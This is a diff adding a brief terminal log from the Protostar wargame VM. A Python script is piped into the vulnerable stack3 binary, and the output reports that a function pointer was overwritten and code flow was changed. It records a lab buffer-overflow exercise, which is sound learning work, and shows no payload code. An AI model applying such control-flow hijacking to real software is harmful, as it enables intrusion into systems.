@@ -1,0 +1,5 @@
+user@protostar:/tmp$ python stack3.py | /opt/protostar/bin/stack3
+calling function pointer, jumping to 0x08048424
+code flow successfully changed
+
+user@protostar:/tmp$
